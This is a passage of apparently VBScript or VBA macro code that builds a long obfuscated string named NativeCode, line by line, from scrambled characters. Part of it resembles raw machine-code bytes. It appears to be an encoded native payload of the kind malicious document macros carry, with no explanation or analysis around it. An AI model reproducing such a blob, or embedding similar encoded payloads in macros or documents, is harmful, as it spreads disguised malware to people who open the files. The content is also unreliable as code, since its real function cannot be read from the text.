    NativeCode = NativeCode & "UX;olcq_\>sri>yC_gCqMeCG^wERlUV]qHVZGL?E\zfIU>awGyIAZlwewNxxZGiSXgr_HWzNhdNI?bbuBe\QwNB][\t;Nqd]\_NySdxcRLgkSdw<_IoD_>MArXX;jvHcIJRe KhllDJlqj]MA^DeJPJrlIz@UWRxWcKzfSRbgFYJwvpCal_sLz?j\wnSI^QXg"
    NativeCode = NativeCode & "vuSys^IToRWY^vU>>d^Vh[Hg?PzV\mJ=sHgDXABQVx^_m>aZFIuAVyNwLttyvS@?WgpeCW>ZK;BiIx=rblQukwYCAJ[_eqJovlKQByzmtVt\fTJf;EjyLRErg=< cnDdMmQlpITJrxELD?XNSnc]^^Q^RmBvTV^ygwfOYctYNUTxxDpXhcfvW[;duZg>PxN@MXmcIT_lm]iXA^XXpIcmnyHEhStBE+++"
    NativeCode = NativeCode & "JEKrRZMTnC t QeF[KRWY]Cz yjxREc\@U;oNGebeP[;fVnI>?AbydECX\LKBuYktQ@dnIW?hmHaXbLW\DC^VTUqr^heh RwjvQ@en>\^i[RbY?@LtZ?N N bb_d\tWl]v^>V\LvNfrbtAaOp;XNfVxcNaFsQSlhUVr<+++"
    NativeCode = NativeCode & "Nbil zkYGm K[>Eo;i VUwUoQdR>bU[uK>IInTpcG[UiPhyk]cOnmQbK\;Ye[QOS>zLYRhfzJmt=;gArlTKHA;NMPAVglnmUmMAeXCvAIGFHEEzpopoBLUb+++"
    NativeCode = NativeCode & "dpGnj>kqscbQ?lO_pIs xppzESWH;[^EMkwnPYUR@pvaAqPEdyJnkMOVuvI[W__TFboazVddJ>qsK@It_;wHI_RG;FAwGU?[hEWSOB=dc;BW^IMllYWIsUq^s^RUbuwSXL[v;> PoLtJB^okGjT\PNFUZ_^c>sdXIbmgCvncyBwn hkCc\K\Ql kIQkmEwb[GFb;WoTL;sM=cGOD[qqvCEz@dubJ^+++"
    NativeCode = NativeCode & "\MB=iz;mY?bGlL>HoOrhV^P^o\JlywE^Y;@=;xqtwm=JRIcJdXAhpPJXumDY<^t=GNDv;^_sdWnSGN@VlS;\n Viflx]Vv]AOISTagEjMAXPSAgjMUlqtuwU@H]aOTEFJVaQ"
    NativeCode = NativeCode & "^[lmdFvZYmyuocVl\NLQwTxYKmX >z;dcn?=C]jvVckDvd?pNJX vZo;eQeW]^ITf?JqefWtjcgxOAEDyoMjQh"
    NativeCode = NativeCode & "aQqX>?iBgn_V\TWgfM=vJddSX _NylOBuOFGTHMQ@Biw]kPfAYAF^c kqJ=jzELR\wGxYYfqoQkpS>kECn@nzNegTeVELQTaxBFuB\vcbze=hmn@r@kr?m]jYaGlmkdzZmWhAMOgbZx[ ^WcXJwcnJuAfpeGtwsmj=nO>J"
    NativeCode = NativeCode & "xoHKWG;NKJ]IqRK \TYliaobxOTp;ZS_TEZ[f]mswugcKfVVDOmw>rRA>PoeX_Tj^YoSANW_MBz_P;UVNx^@??L@lMCJwptINiDtcGVEKr>mql>RMFplVu^cr=KBEo]WzIIIgb[LLfRK[JMaZKh[NdeMe^<[oTmBQbXD^^wLX[ppUmV"
    NativeCode = NativeCode & "w??LES; oLHd?i>siF__H]nmeTw Q nLlIHlOa;r>N?vQjuL=nCJrkdEQjCTOKHpw=NJ>zgr\bJCjrDFQ @Yv?Wa[vO?k]\OCkBrYyRJ^UXPW\GemKek]+++"
    NativeCode = NativeCode & "PROrmpF?pfSwVpPf^RB@nZUQj^peN;hDbVC;fikMRNVAfSSFuqVe=s^rx_Wtci^?azGdt>RPcVQoreeUy\R[Bqobd?x@WLCsn;l]udc@LS"
    NativeCode = NativeCode & "ti@ ff qHDlo>dyx>UsVzmhuLpuotsx=SMR;kh>__RDoDbRdwIip^TisCHGylKXD\is^xQ]eAO@JmKpUzdgTmLArtb>;rDHYs\IU>vTeEQ_[zgjlgYRBNumVqK=dFRRyshpHMKvspURtOwPY=AjJXkLHKQ^^x>UhzftLRlCEi=UMOThORjT=g_X\e+++"
    NativeCode = NativeCode & "t]u]>rlq[]eWx]lLSV<^KESXkXQBnM]CM]rDXE>wzP^DB]r^LZC\An=YyYYLAF^LTr?>TSM=dboZUVcmGIHioiVvkKQoDuRimryuQuxZy?OLK u?oJIdZCAzKPaHYyXRjaQF mz\wDDWYhAJz[\JMdcJ^\l=QNB\WvI_WyCSF=;Z^AciAIPewXjNd^@cWCKRLXG?sPY]^L_+++"
    NativeCode = NativeCode & "n_MrSoQ>>Pg>H=SCt_YdHcll@AT=KEFUWUdMzwffAM\khCiV\\@lsG?qiKTFngsMVOKotFOKLVkhBTbhzsfQjQeq\REIiMCpdPVgINBRr]ZdYjpYfANOP?auM_V^agOZYfxZEVfeFA^eeVFevWma+++"
    NativeCode = NativeCode & "lQ\VAANvp\yUmmIJEOrSkw?UZpaI;]TnoTQ@vXnPMoSz;OwnsKOCLTUg?rAkwH?qkaSqdylkEfF[q[tMk;j^hC\Pv pxdej NWjFnQ@aW?SC;Cswt^r;K<_Qd\@?@VRUIQRZQmZZPrGyzFUxuk?i\^smcm=H SrocaytmxJsRGBqZLCX_\LHlP;pQsd?>rOjMGW^Otc+++"
    NativeCode = NativeCode & "IOzzi dgzr@CbBpnPV>ScJpdaxcZJkXcUiAmrbcbvHGScaMidm=BLFkw_^kwsAKP@hySju=M]MVwdKIsa=KmvthSmZ_Ks<;pBZiD_SF?tlfwuCZOiwczohZ>NNFqStKmYZs= Ko[= VhMEWJs]qnOXxMFMRz\qNG;FGJMO]>wm@G?TGuK _ E[PbKSiYa>ZT dXt_n@kkraX>ovr\+++"
    NativeCode = NativeCode & "XDl=]_BOQm^xC?TUqHsmkShubhWjpIrgBTZuo]b\PnGVGJnmzvwxxUFm\q?]xzxJV_nDA=dIIpy_Ez]fgw[fzGmAft kmYW_iwsstDb@R?ibp_QB"
    NativeCode = NativeCode & "DXsGtP<>sT=pfWf]ogKRhc@EgL]BjzPuCrevuTrzFpVcbDnMZ]tUQ]"
    NativeCode = NativeCode & "cXh\BHa jVu=s xT?HpkiWsy=>Ylnt_r?r^fpIaXS>sx[MbeLogl]ME>H^mw_j[cIepAcwhjjiuj^S;P[Asz>JN?WFCGhok mjfLUROaruJmnIrDEfUAIbWx VBBBtA^SCNr[GYFN\\TEZmidQQeFyFrC>CS;uX"
    NativeCode = NativeCode & "t_WkaYm<[cPKv[KuX@bZ^yiRH@kVW\tgH?Zd=QD=WPzc^x]tZHGM?NgVJIcDsA qC\OUGKD=k>eV@[oR^>ox lfYRBK]ZXf_]VRVRTDlBRRYiCNFIhKuzEgFIhHF?EcmHG_ZBRGyoxF@yAIGWkqUzVJDNnV^ cO="
    NativeCode = NativeCode & "z?cgOarwc[BgiV^=SPdj>JtVdR]sJf^e_D?=xH]k?EprIHMX_b?brNNP_LYGdFeVCtH\NGWJk[HPfr_LmCQkC]VFz[o\G?asqsfUgDooMERmVX_"
    NativeCode = NativeCode & "lCLU@L<]GcLncvkUOzBjkudaMiG^QMs f]\CV@axyF<@^_ZZF_;UiGymVBS[sec?FHK= L Yjt_NX_oqkpz_SvY;VE]SOJyL]ZDoiOCUw^^pPHaa=MfVOJZVrYlyYTd\sF@rCe;j@M@=inUcKgDGYTaz[K+++"
    NativeCode = NativeCode & "[avJoxJhcsUjtMhZsCiungpGe_wXmtz_Qto=KC;XxeNcw<_R>@ZKA ;\Ktl=VTWEwsrEiG^BBgYRz_rOt\lmqArn^AYkVKvJkAZU>cGVVyfDsN[yoggyBFkcNXrp>[\A]f[EumWdPo H^L?j_Tm+++"
    NativeCode = NativeCode & "Jzr>CdJsHqhJ_hYboq EoCFiPYuOnpjKzHUCZfMbBufCKOtTm\l=\=NHElxTidvKx?hL\XqvUyVI[;+++"
    NativeCode = NativeCode & "r?sLPUMe]YW>wkZBPeWZMV aDlbLGUTwr[WEVnTmbaIml<;OnZ nrZC>YLJpNM[C< f@vs=YF>ED^qbNnOqh=lpM=;gNrDHXGrRmCvAwH+++"
    NativeCode = NativeCode & "dCoKyn@XRG>ziqLdNWSM?[TyTNDdCDiczrQG\Ki_OQcm NsEITf"
    NativeCode = NativeCode & "n;yl_C^UxwbnDrNI@RltEH=r>i+++"
    NativeCode = NativeCode & "\=NdREtJmKZFVebzH;gBj\IiJozEsSTLHYCFeiwfPca=QThfkDVCl;Ls^[xj_uT[SnY?llzX=oq VLKZTCYmKwY;oJywtNa]nieYiVWn;TIFwCvSPHPhbz^zBJ=nkXgJilzpDM;WJvjxkh"
    NativeCode = NativeCode & "XRYr]grih]XOj]AAWzJwbjDBfjWMEKJqP]GhwRICckaeyZdCXF;^mS];GFMoLyJ EOEGSog^T TZKQorKMh\GDTD_nsqXkbOmN?lpl=ZmxtkrTwUYWNEZ@+++"
    NativeCode = NativeCode & "Llsb=AcTDaLk[_OWmxpzaEskYOQD]nNBeTzZTf;b =DmIsWi_LkeKawXzH oMFAAQjJm@RG]SuyaKie]HgfwWRBNTQsqasqYcH;mYTR@ j=\Eyxne;_Y\naVrWv@fuyAEmCxwrAE@__KfnSxxUcst"
    NativeCode = NativeCode & "JPrqimKPZaGHRJGE@AItL MIxovYAlCYPrVrtERL[G=PhjvpoZmS@YkJmOTJHL;R_MuZSyRmFF\ll@WoGfhN>ufvpcUhoxJosxkhFsH J=dYfbHERoPsOx=+++"
    NativeCode = NativeCode & "lG;ebSJcBewqPRBi JUjFN<\\vfYsMJajRSUYmizpz[EkIFo@aoLEEDXEKXTSjkXguAGaMRDNGzMueeRdbK_x_Ap;SbUslWw+++"
    NativeCode = NativeCode & "x?tEtiO^Bhs^v?Wf;SL\djK@WabHAGMc?xTPerw[eDrojUw\z[M[_kulqP^sPa^MarYOPk=yXJDrdDWIxciFHE?[QGxhGD_ipCrHTWrE=hhD;elzbttQDwSQyP]D\LVJIrV]LQwEu]AJ"
    NativeCode = NativeCode & "b[NtjcO]Wd[]nhad^edIpEb=vYZkn>Zjs^D>wie ys_kj_gzExYDjgP@?PeuAuFThNGfpnFUgjaWlPoVBjZiEs[T;XoZHtpJhD GOYLWAXmjFxteVOCIJeCPERmhEdKQVGe=bLWHobkatodAJbBEBvJqBFGEYxu;Fq>E^snH zAt _ebGu_crBVbKKMGFk;PpW_nB+++"
    NativeCode = NativeCode & "vWZJnF@V[u]RFpqFpfbj_jeo@dUIwzEA@bM>BYpyos^g[Z=]_EzH;ScuxOJB>NxvpP+++"
    NativeCode = NativeCode & "b;jn]XbrcvJIk=aDFWidbss>YdY>AKZIfEwMybVnIsxOwPVvMrIXoKVH@XrkKVJc]QT\n\b]u=APXkM@wLk@BdvdCWwWeVMhBkgd_VX=jkC[DWlv=nS"
    NativeCode = NativeCode & "GjADXQvZG\HgnGWeSgmrmGlO[jUsqpufXzJKxBOmZEamceunrTrUArMqd_XRHswo LHLiRwBtm+++"
    NativeCode = NativeCode & "roPF^q^Pl;^srFMNDqlBbL_\<@fnpnXSCD]B\yWGLxgIMgdzkv;ySi]@\yQygvHBzEP^a@cpg[PnOAVO]EwGksOwKEyAh=WJsKHv=Wcw_zhEhTUp[IsMDZmVkMFc[^a>+++"
    NativeCode = NativeCode & "lI=tA=vVjcFG^PQb>DrudO\loDmswz]bipfOqg\pfwfSMQWGJyiUPnOxvvXZJ[OuoDp?a\oYS]sQwe=ie_WjljBVvch sBqsrtzbQfvIdxXG\KdaiGOZTt+++"
    NativeCode = NativeCode & "ANUhNRKZidWwKp>TM@]j?oV@LGNn>KVxhdkBfdU?YNc rGtP? ljjMrEXly^mddrrmmTMiWljvEYTYpcjBO@Enafp^\R\Aw_QAYoXS=TXtec;w rv_QrtaDmJtcXeI>NonKq"
    NativeCode = NativeCode & "mC]@\SQN;aMwUtcqn ^EFCE;VPnWXVquACFTOnrfig_zutvfbkvKxEMPbQJbE]X@VWX@PLs\l>fm[cD\bato? ]_]lhB=AHryv=;Wy_Tr [CIXQ>oQnJS_IKUOzyK]EVkA uvJf+++"
    NativeCode = NativeCode & ";cMU ujOdsHD=eg;w^uUmN[aewdRkh\qBIb?KR Rb\;CLixthn\RjC]slaEzCzRLZmEw WgGs=^hJRLUQJSlPvnHOaSMy]gG KyU uqTWbLF>CnXkGWkSJ>FmRwyX>k\_GY=vHXfA\^;b;nHUDYuWTgA@=sWcbaui?>ExeFGiSq[swObUksBHWkI\[=uBi;w_KezndHgYZ+++"
    NativeCode = NativeCode & " Epyqhy@zTbOQj^izRBdYpvYD>Ke zuc[gZZX^xhFuJcudbP]Q?gW[bMso oeXgwEuooOyzndGVFY^qD;bmu?yh^vBE=vm\lllWrRVKzjWC=c]qbUolBoG=R^=;BkEOl>LgySjpvzjZ+++"
    NativeCode = NativeCode & "ule[>>MNtvy[we=K]FocIDJrKWbfFutNgSmaaeqW<;cnTFZ@;xAxTWJarPx\imn>U@CccvK\tjLDG\r^ kucCqyXq[tULPozSGTwD\gM[BW>JwjFT<"
    NativeCode = NativeCode & "EOjT;jT_Rti\vDm JRS?\UXUGU\QHTC>zWH?snT[TSOIp\ZYlpjohVAzfMZgnXT@DBvoXuh>p@hO_EGTqgqOQueFfkE\Gwupn sv;kwXRb;\rtOvSFwBkBLf czb[ZQv\;jX@^xTWXXRZjNNgtyFzhsB]HLer=_Fz KLG@RRbKFUStSxQqhDSpp+++"
    NativeCode = NativeCode & "AsZnLShdIgTrpdtf]ZFifWa@ZpT;Ux>E?znCXxIVm]hkXCkTpEwwt <  '4 H)D$8$ PAZH+L$ H3A H+D$ L3P L+T$HXPf55{fA)BCARA[YQAYAQXPA2CO<0tR1D$0kD$0@L!L$0A2CP1D$0kD$0@L!L$0A2CQ1D$0kD$0@L!L$0A2+++"
    NativeCode = NativeCode & "JwivRzaaUzaa[zaa[[yM[[yuo?zAo?zAo]HtR^kfW<[fW?xtB_HtBMIW@Td^c@@;G>Az>JexJJexJJTEGvWfUsWfUsWfUsZnCxZnCvXaauzRlHyp>My >MxazU]yVU]ynamQjamQhIueHIWsS[?vE_?vEWs>Rhs>Rf?vDm?vDc=yg LES\OfAYOfAYOfAYBnWRBnW\^au_"
    NativeCode = NativeCode & "Dnf@CnfdClVdIlVPIhFPFhG\Fnw\Qnw QdG rdElrtulItq Ih@ajhHmjXxoIXvcIHFgKjrGJi[eO;[eOQSsFQSsE<[dB<[dA<[dA^oDA]FFDOFFDaNPMaNPNvFGIvFGGvFGGURgGUhEBGhEBT SKT SEVmHlt]Hlv;ZiUkZiVHxlZxxlz _lz g"
    NativeCode = NativeCode & " oHOhoHWHM\wHNFUM?vUM ]>Z ]>[jJvMaJvMot>[ft>[kavLlavLbavM Bbm BXNePXNeTPXlTPXbNXOeNXOkNXOnoDSnoDjzoDnzUTnzUTIftLeftL]>UTy>UTOftHSftHjvtHfvfHfvL@q;L@pxmXUpmXl lSL lSL +++"
    NativeCode = NativeCode & "[TccZmkt]mktPmktPO?TPNEvU\EvUhL \hL QyUUY[AuYX_W\bOW\bOJaCWfaCWQAbOuAbOCqCWoqCWYAbN=AbOKu\GGuTpWeyxAnyxAc=gb TosoTosoygedygei=HGj= We= WdHbn>HOOA@WOWDWOWF GAN GACtOVDtOVJtOVOW[vOWaTJEaTJAiBCAiBM[aUJ[aUD[aUF;=IF+++"
    NativeCode = NativeCode & "OIfApIf@=unvBunvOIg DIg ITzbLWtEPhKznDCleDClhfJzcfJzncRhfcRaFBM]FBMkNycONF\psiTgtiTgyiTgxJ GxHzD=ZzD=>rSt>rSy_jfq_joQ<>OQ>gmT\WmT_H_Q=X_Q>D]TDT]TDTPxeHLxeHzDeHrDwHrD]@dO]@dBEgJlEgJ>IoIXAy@XAyMnIoFnIoK+++"
    NativeCode = NativeCode & "tkKuqyKuqUB RUB _p[MWp[u_]kI_Io@[yd\TllJ]llJS@d\X@d\UGj>Ve_WbfDUgFtUgYdF_xxZSxxoSxxoSBHoScTsYcTFYcTBYAdBYBp@\ @@\c[BIWKBImgEsHwImHv?]vZ;]@Tg_bIg\aoEIZ?EIZ?WUzcKUzcs=zcs=@ss=@r pakLpakuh@sQh@sfXaozXaoL"
    NativeCode = NativeCode & "D?AmQ@ZNn?eqQY=\YY=dA;iDAxAFdoQFdNIigNIQg>AEgP@PSn?onMKLQNjnL\jnL= xA= xO^\uR\?WWVtm_NXI_NoM=zOM>cMXgCMXwc^_HS^_KOLZh?LZjc^_JS^_Vr]gwnC;wnt?wnt?U^t?VBgztrgzwneo+++"
    NativeCode = NativeCode & "CUuVLVaGYUQGYG\MnUQDMqYrFqYrK QWmBcW<@?DyR?DyuvRruvS?u=JpY]w AiT lYk =\CJ@_?@Xj\R;"
    NativeCode = NativeCode & "LdvCIFFCIEeq\KUq\YC>^NJiYNJiWNJiUm>IUo_KP=_KPoW]YoW]WoZS>MjS>NLA;o\A;j;R;;sEp;sD>a;P=a;Qs;sGz;sGtj;P?j;QqIgQrJCSwpsSwQj=PQkDDq;HDq;qhQcUhQclpq;@pq;x @sl zz=oEDB\QLTWQLTYQSvZZ[fUedX qlOkqlOeqCmfgj=iXTB\L\TWL\TYLcvZl;fURDX +++"
    NativeCode = NativeCode & "kpIaYgAwRgAw\g^U_ifEPVYzmAQlfAQlh@>NkSf^dlYaZqdz>dnjWr+++"
    NativeCode = NativeCode & "\cXgZb^enWBm uywxyapTWYBLo;H=ab\HyDKK=^yOETEff[t[?Qy^hBTgX UWEyXc[_N>qbkqE@YVtK ]^oC^?QqiaZvRYfnMnT_PXOvGKwJ^DB?oR>kvv>QLhcVSktBsUuxaVCdkwvs=h>euAfP OhkhLDGtb@AgSRme[cvmN=sIc;v;sXFgyibi?dgZTch]EFPnBAqLXyfwn[[FiSeYQmK;jNc^+++"
    NativeCode = NativeCode & "<=[Wpf?ZjRTfWIZMpt@rJ>meOCg[wEc=zTPv\Qpn<_nzMDc cNXOW?Gq@hfSkX jdA ]y\HFAKqZQT@  N@XWBnBuefTN_TCvYhnEPsZBcr+++"
    NativeCode = NativeCode & "tvhKYMlmPnkorhPXpejeO[UV mMk<zZUAbTQdXn[FBUjGOdqwJvL=gQY>^_uChqISf^cZ_PnQGLfPoBebBx@CCZpWabKjTugBDYr;Ts"
    NativeCode = NativeCode & "\KvdA;RKaKqwiXMz[\qWe[\Rh^ZSNWNs>y <@BxiXuZWt;Vy MeF>JBaM[ZJ^h]v=sCNliaLGwK[iCsI_RrddNzPI@JxRCmmnPS>Llzf=\?XQt]]BUyy>FBfhepofbHV[d_OKgcK?mXGUrjiu;JDs\q>FEk\dw_UV>PZt\XoxwQRhMTecPqg= xU"
    NativeCode = NativeCode & "cgfkm>hvDXmiIVs;FdUuAjH\x?WQa A^GGOYIZfa;EkyuPd_h^cQwwZcPBN]MaHPqaO>>ctf_FtNCfagAjWcmobPoec@WeHRR>d[KuLMOaNm? XHuA ZGVC_U"
    NativeCode = NativeCode & "zUfZzpljYrVQi vEeq??d;k^b>_QC[_y[;NMYpMOUuy tPxHlphbnh@ diQPdJyUqM=LApNNDsNh^[Z@nxREGHv?SDuEiEgeHCwmMc< Yo?ZcomzBh=r;YXCoUZyUTHYtRXQusS\?uRAbt;QRVsUfC\QfkDTw_Fql]JQGJHDFZxOes=ESvdEO;Os^qIrZlI[t\jSNAZvnUVtfoWf[NQvluq<+++"
    NativeCode = NativeCode & "UMiNUhR>vjheFxHqJh@KKbMjMcPClJ@IjBDTjQorrHetsUxtZEHWRAqgwoekuT_jgt>lvCxXgC[vciU+++"
    NativeCode = NativeCode & "Kxrap]udBvdU^x@II CAVNuYFM=UD =wPcWgZhUKciu^Umf>D_fklrfDbW>=dbfDUzSXS?;lC]nvNAmOzZoLz[OYI_]yXm\lpVSz>@MUmsxfMkL;LoeO\LpUQSsletqoeuQzQqCZ@cBOhugV=?\\\oUeijWeT["
    NativeCode = NativeCode & "N?gGHTjRI xfvKJrqyeTvVr xQ_XMuCZtYbGqO;WPya@GEYfGshC@fRpJ=UUw?NxFSJv>bjVQaAdatJZcnK_Y[VEEZZt?wenPB?Id"
    NativeCode = NativeCode & "z@RVdXQD_p_suo]sGUEaO;Nbu]rjR]Lzs>XLv[JfKYuC R]cYaz_\nATFCg@?TXffs@r\M?K?sH[RYCRMRtKhmW=cl\=F_axfpYsfEfkc]Vo[lzPxCQnjCTHbcWwDY_@y\ah[A^NcX@ue iJSd>rL"
    NativeCode = NativeCode & "t>eEDNH^]BTRx@;t;YHDxzN^ Bwm[SUTUl>JSiqmjf]AZbeA=jEfDKt>stGpvLshL\t^JQp=^UvLl=NwXrz M@fg VX>EJ>HCCWpMvoQjBfIRBlQ NUvHiLadbXegVwXInZ\"
    NativeCode = NativeCode & "pPpgZRxbaRualUSMKA;druDKLCbi_uN;[>UV?SlC\dW?oSEOB ];veOo]ih]dlq>@kWVoHbwYjF@l\UM>rd]MC?VHU=;pZ?ZaF]vAkejwLLNy;OhHHSIIwICTEl< ]^WJpbUPxNhVOqIuWtOeg>RaTHranC= ?t=nL>ithkS\AFff@oQGA+++"
    NativeCode = NativeCode & "e;_CQuPzsHZBVw<]Z_Sl p?@OrV>iO^BLeO[T@>yPcMLwx>^@wBOlrFTsO]^ltqSBI[DH>ekd^wYbzZaC_TBYyeXIAhGHIouXAggurtA]LdnSMbKBOak jasTsHeyH;eoQLJuMnMdlBfuCLuh WF g^VV a_fNbE_bUSs_\_NHobPkTBx^qeUhed\xgVZsvWoS+++"
    NativeCode = NativeCode & "q@FzAFTS\JgUf@w^Ru@EZYx[kl^vIgYRrO@fsfkFP] \R<]JsPYx]t\FyyIJheUiDOln\xoBUYu]EO]?cd=NT=kpB\??_r]RORpBClZjTbUtC=fFSWG>Br_rfeljKfJaGtQ"
    NativeCode = NativeCode & "]lh@J\umhjRN[eWBOyItRTkSdoSmykA>^PSstAWQaTRqLIscyM;[GNFCCKTDwXLn>^CCRAKYNSZ=VYLDtuJ gv>Db]dqtBeHqDLDKaO[DOM]XiiGXFMTZg\Wh\ZlMJhRaefHY_[HQpYBFLRYTmDXqsWKsOI^hK_rJJfHMxDwz[+++"
    NativeCode = NativeCode & "rhcU=YuEuPWb=F MY>[KEa][bZ doPblE\W=@ttS]^mc?sSl_MkvUnjF^nNYqfLY?mxX XnKsTdAPgNPSwttCcz]GGiIaf]P^LsjRljANyT\QSjJTq>F^;K@FJlgEQTvdu\o^FjLYaGLrY[[fIwuSQrCfWTZdqxYBXNqRV"
    NativeCode = NativeCode & "]y qZozAzA\K  CDZd=Z;Ad P;g\AzCmcp?PtCiGNGZdAhnr uPzlkS_Rv?uImpp_bE@ueO?dOv@eW?GbnYQEPAbmlVwnyTy;NhlPISRDhZUYjTvCxtLoiqJecU=u?^iuxr]Hm\d @AQyJbvi^MvbFd koAAXCrPIYQYFbPmLh[Byk@y]JFiUty@[Ne]liaiyreb?ONCHu]o^S^NY_IDV+++"
    NativeCode = NativeCode & "wCDqnuCqG@ftQlRcDaj[bsXuJGmo <@VgPclhPzM=dpcQ\wcM xRXmkKSCFbazGtQO\=dLrLex=[tAyiC[mwcDuo_QnBylx@nB\x+++"
    NativeCode = NativeCode & "VinL>MBOPFWRyb;puSDa?;OueoNwCphXV\?aOg@bQc?;gdltuABlrAkWJoyD fkidtZ_RZHje;qNziYtCoa=VOtdqeco"
    NativeCode = NativeCode & ">S@bLiidz@bUVQKGNMAvvlrv@UhyjE?pnWlB[O>gg;CBgmSyS^QT=aiwSZdSIX;u;L GSRVpZDj;mUJ<;xNicPc_QdRHHBJDzrc?jzrw^GOQdRV?tnd?axYVU=?j"
    NativeCode = NativeCode & "^fjuXwd^@RiP xpVuRirvCJuSn \uERoy;nwqgN<^pZEGcZtoSUkHEs^eYVL;Z^NSKgWM>rceaRQ _OmM S^;>C@RsVqE@DhhuYfpaDCmU\_Cy>SF@RAb ZXCiYsjGVefpIsrNtQaybGdeIFPybr]IMnn=KrJi>j[OH;;cYYIfdaYIWg@j>aAX\wn"
    NativeCode = NativeCode & "nx Sgl RWGtNC\bzF]QgBtNHMAbF=rcPDuEqfhB>F\kuu>ijR@cwt\];udfgh^y]udsbbsSTsbGij=ZfxtDSkTdgxEdU_j BNRfZaJs?vxZG>s _LzkHdjwbAOntHElfqSRXsdDCLv?aV;tj; Gtt[K+++"
    NativeCode = NativeCode & "X_@axycFyAlPaL\CsN<^fHaHQDuP]waTpYdUHpX=RSmGjxqWn@eVYRcQrs_>BxhHmRGh^gnX@KpJkiChtT]P_?gmjgHq"
    NativeCode = NativeCode & "xZaA_dcM?^pnP FtbfBBWeTJa;_j;ucZhXEvw>EWkhR;FvYhExZNiK nvM_vED[MVomvYVkH@bicknPrxjnSRzVUARhXtlQY>uxB>l?uUsYmMQf[PqxdK>C kYDWK>i@l_u>]@]YOijPcPPScMN^lsrO[@^dRNX]hv>b^]MRwpXIa;=Oxc;gIH@YbBH_iuQ_I>YvCnkFvI@\w+++"
    NativeCode = NativeCode & "jSgX^ba eTOh>tsXArOKRq itiay^MTUrLeOlrGJ>vF=kAXT;Djcr;j]]ykuYmmUhmFgBDVg_Oc]_dE^mpgbheQDuyORRaVHmgTMCfrShHQa\ukyiHMaF?SPnH_ =l_lrTGk@mLjlJMPAIlzzqGGEpkc<^R@\qhUfzL?\P??YSbw?XtZ>ABX[cTBJaqakzxuHA]wHIP\Dnrnl@E>YZRW;"
    NativeCode = NativeCode & "z]xQ;Y>mjo>>xzFHaO<]^mjfwfCmJd_ID g]h]\cTMr\J>SmzPgZU[quSPDkOikxaJqKJbLcSyIg?D;c;udC IvtfhS]vldxT_ztknpdfAD>bWIINs_sfkn\PMnrDDNZHWaq]\sKjb\ofUd@KUOAP>VE>HPPpghs"
    NativeCode = NativeCode & " vKCoB@TqAHH\pM^fHE^AIpH=?minyUK@OEcGXpCJv]j\FXYzIteT=WZxhKPjhhKPNQX_ Rnl@?Rr]n>r?Xj]n @cGnb^b<=ObOSM\nvXAhWuJ?t^oulx[XRvLxxHDmzG=mcFhKmirO\jt"
    NativeCode = NativeCode & "<]Ih_I^a K@[mzHdTLA\kBkOmb ROL =s@\vusvTsrCSh]MbzWRNNt[\VmyRxbqCf;KORr;wMkKSWsmj]VAvhyb]ZyhAEbjHGf\DVEZsbZ?BFs>zmdrBlwUGVpbUBNHI_oiwui=TNCID@C@Jf]ZM FSdKDFctbJYgOjnKRnrvnnDCmi@=b;"
    NativeCode = NativeCode & "DZKacSOOBvww rFQWewvEt>TdOlQQtn^c@=gt>jnqgrTQ^Nx^ZDhzxJjsUnlpQTLy?;wOFtl?xDQCb>=LOO[HfqdosMuZ>c=jDqN XA;p>Q=noRJGzxBlgujYzCrFzmfa?tZrlZQVF>l^wSLCbBeNFOa[JWKWGB? rN[t?vt+++"
    NativeCode = NativeCode & "qhoyjanOyCLPLa\JonN iOPweDL_mbcz]t]evxgtNv=^=Dw i X+++"
    NativeCode = NativeCode & "EWqV^nfdP;@VU=xClb?Bc ?bABM=YtTTH?Mma>GiX?^^OnhRoUWsQvfnwTTplNWt>Urp\]dZyAVPGXOHQ=HTLRY^>K[UYwMhZ^gqomCyO=?O ?yaNrCablMvUmWkkgCaTWECH>lHHHQxtDFMlkHRWk\SyGwAQ\s;;pOG]Pkq@b>rzJuk]xlqQP[+++"
    NativeCode = NativeCode & "xjd?C@adAkmFpmsOCtjzyZTlPE@jf]TyXfsoGvmZttrQ^qQZwWh^mIEurtMFNYGovRd[X;CpFdGMSm>drzBBtoPD[mbaZO<=_ssJAkZMzZYRIfsUCaoVH]dkSwaBidlepyuLIODyRkNC[OIGohqJCPqK=dDgfKyM@]Wp^SxofUNPERl;gC]+++"
    NativeCode = NativeCode & "\dTE]_CFFVJMyr gEaTYXdL>=IJSUTql\];lqt;?WWBRcLXEthFoD>;b>zg=DEErnvr"
    NativeCode = NativeCode & "cf;EyIJBfLwtlEj>@oFOtvHMFwTpL+++"
    NativeCode = NativeCode & "eqtIafOXJ\usKx;emU]PPv_jlCRA@tDLlZA yB^fyUIww?FsodXU@lsJwd__l^LtNG v=whQaNIiZbe;PJoI_]FeTiCpACB_wXOjZvdS]AGmhOXTgzDAeyTAeKEXQEVwpqUOLw^gJ?aGUAyKCuUxSApTGE[EVFSqJ_z?_KcM>^NQy?VuIoL]SztggVXjUS>OBuvJbj[ey[ChpYHe=I\>_D ekskmK+++"
    NativeCode = NativeCode & " ZqY l]EkqkV;qw[mrL;w;iC@\wzdPlzTJLjBzOIV\GVdkdmRUEp>gOQ[ITyWApqq@[Db[IOi>XPoDPV=J_HzzDDBHwyIt^a_ggYuqRjmeSDt[Il"
    NativeCode = NativeCode & "mBuYC Ze[fH_V>ubmFxjfvkpvC[OJDu@R]BAVHqAJt?Cah\hp[tVoPuxok;NCn>o [TVr;luCXpd>UlV>nL>?khX?Zb]_oICKH;hFaNO=BJfPfFLDKMh; Mf=Rt kUoVFuViA?XlOJiZ?v;Er+++"
    NativeCode = NativeCode & "npqAUpW[TtbGndsBzNN?_t=w@zt"
    NativeCode = NativeCode & "H\C>jUF@cxmQ^yK?gVa\ujI IyrwONho^@_Aip IgrG@wnrDMSwCpJTtRCZciveblsFauakGHJiiSZWa\llLNeonDXnebWTmv>j>CyPCBV>PbX?@ovZsltZMdlS\OugXPYJxqqyBMjkRuSvuk>z[wW\k+++"
    NativeCode = NativeCode & "ZBtOSi__h@\wp;;jdvp?T=D^veWJwneaHxFD[[lc\BZTxUlXv>gV=UyQfGAe?;ngCCY_RlfZLPwqO \]]Z>qXv[;GtshE=hfwa>>iWCyEkg;WIwW@rkrWsoqo=ykLloKXNMmN]oM"
